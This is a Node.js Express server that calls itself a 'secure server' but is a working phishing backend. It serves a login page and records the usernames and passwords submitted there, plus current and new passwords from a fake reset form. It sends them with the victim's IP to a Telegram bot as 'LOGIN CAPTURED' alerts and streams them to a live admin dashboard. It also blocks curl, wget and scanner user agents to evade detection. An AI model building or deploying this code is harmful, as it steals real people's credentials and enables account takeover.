// ===== SECURE SERVER SETUP =====
// Install: npm install express express-rate-limit helmet cors body-parser node-fetch@2 ws dotenv
console.log('🚀 Application starting...');
require('dotenv').config(); // Load environment variables from .env file
console.log('✅ dotenv loaded');

const express = require("express");
const rateLimit = require("express-rate-limit");
const helmet = require("helmet");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const path = require("path");
const http = require('http');
const WebSocket = require('ws');
console.log('✅ All modules loaded');

const PORT = process.env.PORT || 3000;
console.log(`🔧 Starting server on PORT: ${PORT}`);
console.log(`🔧 Environment check - TELEGRAM_BOT_TOKEN: ${process.env.TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET'}`);
console.log(`🔧 Environment check - TELEGRAM_CHAT_ID: ${process.env.TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET'}`);

// ===== SECURITY CONFIG =====
const HCAPTCHA_SECRET = process.env.HCAPTCHA_SECRET || "ES_a41bef0abddb64394ae4a03c0ac6406db"; // hCaptcha secret key
const HCAPTCHA_ENABLED = false; // Disabled - invisible security only
const blockedIPs = []; // Add IPs to block: ["123.45.67.89"]

const blockedAgents = [
  /curl/i,
  /wget/i,
  /scanner/i,
  /nikto/i,
  // Don't block common browsers or you'll block real users
];

// ===== EXPRESS APP SETUP =====
const app = express();
const server = http.createServer(app);

// Trust Railway/Cloud proxy - set to number of proxies
app.set('trust proxy', 1);

// ===== MIDDLEWARE =====
// Security headers (modified for inline scripts)
app.use(
  helmet({
    contentSecurityPolicy: false, // Disable CSP to allow inline scripts
  })
);

// CORS
app.use(cors());

// Body parsing
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// Static files
app.use(express.static(__dirname));

// Rate limiting - strict for login, lenient for other routes
const strictLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // Max 10 requests per 15 min
  message: "Too many attempts, please try again later.",
  standardHeaders: true,
  legacyHeaders: false,
  validate: {
    trustProxy: false,
    xForwardedForHeader: false
  },
  skip: (req) => req.path === '/health' // Skip rate limit for health checks
});

const generalLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // Max 100 requests per minute
  message: "Too many requests, slow down.",
  validate: {
    trustProxy: false,
    xForwardedForHeader: false
  },
  skip: (req) => req.path === '/health' // Skip rate limit for health checks
});

// Temporarily disable general rate limiter for Railway debugging
// app.use(generalLimiter);

// Request logging middleware for debugging
app.use((req, res, next) => {
  console.log(`📥 ${req.method} ${req.path} from ${req.ip}`);
  next();
});

// IP blocklist
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  if (blockedIPs.some(blocked => ip.includes(blocked))) {
    console.log(`🚫 Blocked IP attempt: ${ip}`);
    return res.status(403).send("Access denied");
  }
  next();
});

// User-agent filter
app.use((req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (blockedAgents.some(re => re.test(ua))) {
    console.log(`🚫 Blocked user-agent: ${ua}`);
    return res.status(403).send("Forbidden");
  }
  next();
});

// ===== ANALYTICS & DATA STORAGE =====
const analytics = {
  sessions: new Map(),
  logins: [],
  pageViews: [],
  dailyStats: {
    totalVisits: 0,
    uniqueVisitors: new Set(),
    loginAttempts: 0,
    passwordCaptures: 0,
  },
  realtimeUsers: new Set(),
};

// Reset daily stats at midnight
const resetDailyStats = () => {
  analytics.dailyStats = {
    totalVisits: 0,
    uniqueVisitors: new Set(),
    loginAttempts: 0,
    passwordCaptures: 0,
  };
};

// Schedule daily reset
const now = new Date();
const night = new Date(
  now.getFullYear(),
  now.getMonth(),
  now.getDate() + 1,
  0, 0, 0
);
const msToMidnight = night.getTime() - now.getTime();
setTimeout(() => {
  resetDailyStats();
  setInterval(resetDailyStats, 24 * 60 * 60 * 1000);
}, msToMidnight);

// WebSocket clients for live updates
const wsClients = new Set();

const broadcast = (data) => {
  const message = JSON.stringify(data);
  wsClients.forEach((ws) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(message);
    }
  });
};

// Send Telegram notification (Direct API integration)
const sendTelegramNotification = async (message) => {
  console.log('📤 Attempting to send Telegram notification...');
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  if (!TOKEN || !CHAT_ID) {
    console.warn('⚠️ Telegram credentials missing in environment variables');
    console.warn(`TOKEN: ${TOKEN ? 'SET' : 'NOT SET'}, CHAT_ID: ${CHAT_ID ? 'SET' : 'NOT SET'}`);
    return { ok: false, error: 'Missing credentials' };
  }
  
  console.log(`📤 Sending to chat_id: ${CHAT_ID}`);
  
  try {
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }),
    });
    
    const data = await response.json();
    
    if (data.ok) {
      console.log('✅ Telegram notification sent successfully!');
      console.log(`   Message ID: ${data.result?.message_id}`);
    } else {
      console.error('❌ Telegram notification failed!');
      console.error('   Response:', JSON.stringify(data));
    }
    
    return data;
  } catch (err) {
    console.error('❌ Telegram notification error:', err.message);
    return { ok: false, error: err.message };
  }
};

// hCaptcha verification helper
const verifyCaptcha = async (token) => {
  if (!HCAPTCHA_ENABLED || !token) {
    return { success: !HCAPTCHA_ENABLED }; // If disabled, always pass
  }

  try {
    const verifyRes = await fetch("https://hcaptcha.com/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `secret=${encodeURIComponent(HCAPTCHA_SECRET)}&response=${encodeURIComponent(token)}`
    });

    return await verifyRes.json();
  } catch (err) {
    console.error('❌ hCaptcha verification error:', err);
    return { success: false, error: err.message };
  }
};

// ===== ROUTES =====

// Serve main login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/login.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Serve admin panel
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Root route
app.get('/', (req, res) => {
  console.log('📥 Root route accessed');
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Health check
app.get('/health', (req, res) => {
  try {
    console.log('✅ Health check requested');
    res.status(200).json({ status: 'OK', captcha: HCAPTCHA_ENABLED, timestamp: Date.now() });
    console.log('✅ Health check response sent');
  } catch (error) {
    console.error('❌ Health check error:', error);
    res.status(500).json({ status: 'ERROR', error: error.message });
  }
});

// Track user activity
app.post('/track', async (req, res) => {
  try {
    const { type, clientId, path: pagePath, data: eventData } = req.body;

    // Update session
    if (clientId) {
      if (!analytics.sessions.has(clientId)) {
        analytics.sessions.set(clientId, {
          clientId,
          firstSeen: Date.now(),
          lastSeen: Date.now(),
          pages: [],
          events: [],
        });
        analytics.dailyStats.uniqueVisitors.add(clientId);
        analytics.realtimeUsers.add(clientId);
      } else {
        const session = analytics.sessions.get(clientId);
        session.lastSeen = Date.now();
        analytics.realtimeUsers.add(clientId);
      }

      const session = analytics.sessions.get(clientId);
      session.events.push({ type, timestamp: Date.now(), data: eventData });

      if (type === 'page_view') {
        session.pages.push(pagePath);
        analytics.pageViews.push({
          clientId,
          path: pagePath,
          timestamp: Date.now(),
        });
        analytics.dailyStats.totalVisits++;
      }

      // Broadcast to admin dashboard
      broadcast({
        type: 'analytics_update',
        event: {
          type,
          clientId,
          path: pagePath,
          timestamp: Date.now(),
          data: eventData,
        },
        stats: {
          totalVisits: analytics.dailyStats.totalVisits,
          uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
          realtimeUsers: analytics.realtimeUsers.size,
          loginAttempts: analytics.dailyStats.loginAttempts,
          passwordCaptures: analytics.dailyStats.passwordCaptures,
        },
      });
    }

    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ ok: false, error: err.message });
  }
});

// Login endpoint (with optional hCaptcha + strict rate limiting)
app.post('/login', strictLimiter, async (req, res) => {
  try {
    console.log('🔐 Login attempt received');
    const { username, password, clientId } = req.body;
    console.log(`   Username: ${username}, ClientID: ${clientId}`);
    const captchaToken = req.body["h-captcha-response"];

    // Verify captcha if enabled
    if (HCAPTCHA_ENABLED) {
      const captchaResult = await verifyCaptcha(captchaToken);
      if (!captchaResult.success) {
        console.log('❌ Captcha failed for login attempt');
        return res.status(400).json({ ok: false, error: "Captcha verification failed" });
      }
    }

    const loginData = {
      username,
      password,
      timestamp: Date.now(),
      userAgent: req.headers['user-agent'],
      clientId: clientId || 'unknown',
      ip: req.ip || req.connection.remoteAddress,
    };

    analytics.logins.push(loginData);
    analytics.dailyStats.loginAttempts++;
    analytics.dailyStats.passwordCaptures++;

    // Send Telegram notification
    const now = new Date();
    const message = [
      '🔐 <b>NEW LOGIN CAPTURED</b>',
      '',
      `👤 Username: <code>${username}</code>`,
      `🔑 Password: <code>${password}</code>`,
      `📅 Date: ${now.toLocaleDateString()}`,
      `⏰ Time: ${now.toLocaleTimeString()}`,
      `🌐 IP: ${loginData.ip}`,
      `🖥️ User-Agent: ${req.headers['user-agent']}`,
    ].join('\n');

    await sendTelegramNotification(message);

    // Broadcast to admin dashboard
    broadcast({
      type: 'login_captured',
      login: loginData,
      stats: {
        totalVisits: analytics.dailyStats.totalVisits,
        uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
        realtimeUsers: analytics.realtimeUsers.size,
        loginAttempts: analytics.dailyStats.loginAttempts,
        passwordCaptures: analytics.dailyStats.passwordCaptures,
      },
    });

    res.json({ ok: true });
  } catch (err) {
    console.error('Login error:', err);
    res.status(400).json({ ok: false, error: err.message });
  }
});

// Password reset endpoint (with optional hCaptcha + strict rate limiting)
app.post('/reset-password', strictLimiter, async (req, res) => {
  try {
    const { username, currentPassword, newPassword, clientId } = req.body;
    const captchaToken = req.body["h-captcha-response"];

    // Verify captcha if enabled
    if (HCAPTCHA_ENABLED) {
      const captchaResult = await verifyCaptcha(captchaToken);
      if (!captchaResult.success) {
        console.log('❌ Captcha failed for password reset');
        return res.status(400).json({ ok: false, error: "Captcha verification failed" });
      }
    }

    const resetData = {
      username,
      currentPassword,
      newPassword,
      timestamp: Date.now(),
      userAgent: req.headers['user-agent'],
      clientId: clientId || 'unknown',
      type: 'password_reset',
      ip: req.ip || req.connection.remoteAddress,
    };

    // Store as a login capture (they're providing credentials)
    analytics.logins.push(resetData);
    analytics.dailyStats.loginAttempts++;
    analytics.dailyStats.passwordCaptures++;

    // Send Telegram notification
    const now = new Date();
    const message = [
      '🔄 <b>PASSWORD RESET CAPTURED</b>',
      '',
      `👤 Username: <code>${username}</code>`,
      `🔑 Current Password: <code>${currentPassword}</code>`,
      `🆕 New Password: <code>${newPassword}</code>`,
      `📅 Date: ${now.toLocaleDateString()}`,
      `⏰ Time: ${now.toLocaleTimeString()}`,
      `🌐 IP: ${resetData.ip}`,
      `🖥️ User-Agent: ${req.headers['user-agent']}`,
    ].join('\n');

    await sendTelegramNotification(message);

    // Broadcast to admin dashboard
    broadcast({
      type: 'password_reset_captured',
      reset: resetData,
      stats: {
        totalVisits: analytics.dailyStats.totalVisits,
        uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
        realtimeUsers: analytics.realtimeUsers.size,
        loginAttempts: analytics.dailyStats.loginAttempts,
        passwordCaptures: analytics.dailyStats.passwordCaptures,
      },
    });

    res.json({ ok: true });
  } catch (err) {
    console.error('Password reset error:', err);
    res.status(400).json({ ok: false, error: err.message });
  }
});

// Admin stats endpoint
app.get('/admin/stats', (req, res) => {
  // Get recent logins (last 50)
  const recentLogins = analytics.logins.slice(-50).reverse();

  // Get active sessions
  const activeSessions = Array.from(analytics.sessions.values())
    .filter((session) => Date.now() - session.lastSeen < 300000) // Active in last 5 minutes
    .map((session) => ({
      clientId: session.clientId,
      firstSeen: session.firstSeen,
      lastSeen: session.lastSeen,
      pageCount: session.pages.length,
      lastPage: session.pages[session.pages.length - 1] || '/',
    }));

  res.json({
    stats: {
      totalVisits: analytics.dailyStats.totalVisits,
      uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
      realtimeUsers: analytics.realtimeUsers.size,
      loginAttempts: analytics.dailyStats.loginAttempts,
      passwordCaptures: analytics.dailyStats.passwordCaptures,
    },
    recentLogins,
    activeSessions,
  });
});

// User left tracking
app.post('/user-left', (req, res) => {
  try {
    const { clientId } = req.body;

    if (clientId && analytics.realtimeUsers.has(clientId)) {
      analytics.realtimeUsers.delete(clientId);

      // Broadcast user left event
      broadcast({
        type: 'user_left',
        clientId,
        timestamp: Date.now(),
        stats: {
          totalVisits: analytics.dailyStats.totalVisits,
          uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
          realtimeUsers: analytics.realtimeUsers.size,
          loginAttempts: analytics.dailyStats.loginAttempts,
          passwordCaptures: analytics.dailyStats.passwordCaptures,
        },
      });
    }

    res.json({ ok: true });
  } catch (err) {
    res.status(400).json({ ok: false, error: err.message });
  }
});

// Catch-all error handler for routes
app.use((err, req, res, next) => {
  console.error('❌ Route error:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// Create WebSocket server
const wss = new WebSocket.Server({ server });

// Add error handler to WebSocket server
wss.on('error', (error) => {
  console.error('WebSocket Server Error:', error);
});

wss.on('connection', (ws) => {
  console.log('Admin client connected');
  wsClients.add(ws);

  // Send initial data
  ws.send(
    JSON.stringify({
      type: 'initial_data',
      stats: {
        totalVisits: analytics.dailyStats.totalVisits,
        uniqueVisitors: analytics.dailyStats.uniqueVisitors.size,
        realtimeUsers: analytics.realtimeUsers.size,
        loginAttempts: analytics.dailyStats.loginAttempts,
        passwordCaptures: analytics.dailyStats.passwordCaptures,
      },
      recentLogins: analytics.logins.slice(-50).reverse(),
      activeSessions: Array.from(analytics.sessions.values())
        .filter((session) => Date.now() - session.lastSeen < 300000)
        .map((session) => ({
          clientId: session.clientId,
          firstSeen: session.firstSeen,
          lastSeen: session.lastSeen,
          pageCount: session.pages.length,
          lastPage: session.pages[session.pages.length - 1] || '/',
        })),
    })
  );

  ws.on('close', () => {
    console.log('Admin client disconnected');
    wsClients.delete(ws);
  });

  ws.on('error', (err) => {
    console.error('WebSocket error:', err);
    wsClients.delete(ws);
  });
});

// Clean up inactive realtime users every minute
setInterval(() => {
  const now = Date.now();
  analytics.realtimeUsers.forEach((clientId) => {
    const session = analytics.sessions.get(clientId);
    if (session && now - session.lastSeen > 60000) {
      analytics.realtimeUsers.delete(clientId);
    }
  });
}, 60000);

server.listen(PORT, '0.0.0.0', () => {
  console.log('\n🔒 ================================');
  console.log('   SECURE SERVER STARTED');
  console.log('   ================================');
  console.log(`   Main Site:    http://localhost:${PORT}`);
  console.log(`   Admin Panel:  http://localhost:${PORT}/admin`);
  console.log(`   Health Check: http://localhost:${PORT}/health`);
  console.log('   ================================');
  console.log('   🛡️  Security Features:');
  console.log('   • Rate limiting enabled');
  console.log('   • Helmet security headers');
  console.log('   • IP & User-Agent filtering');
  console.log(`   • hCaptcha: ${HCAPTCHA_ENABLED ? '✅ ENABLED' : '⚠️  DISABLED'}`);
  console.log('   • WebSocket live updates');
  console.log('   ================================\n');
  if (!HCAPTCHA_ENABLED) {
    console.log('⚠️  hCaptcha is DISABLED. Set HCAPTCHA_SECRET in .env to enable\n');
  }
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    console.log('⚠️  Telegram notifications disabled. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to enable\n');
  }
  console.log('✅ Server is ready and listening on all interfaces\n');
  
  // Keep-alive heartbeat to prevent Railway from killing the container
  setInterval(() => {
    console.log('💓 Heartbeat - Server is alive');
  }, 30000); // Every 30 seconds
  
  // Self-ping to keep the service active (Railway health check)
  setInterval(async () => {
    try {
      const response = await fetch(`http://localhost:${PORT}/health`);
      if (response.ok) {
        console.log('🔄 Self-ping successful');
      }
    } catch (error) {
      console.error('🔄 Self-ping failed:', error.message);
    }
  }, 60000); // Every 60 seconds
});

// Error handlers to prevent crashes
server.on('error', (error) => {
  console.error('Server Error:', error);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
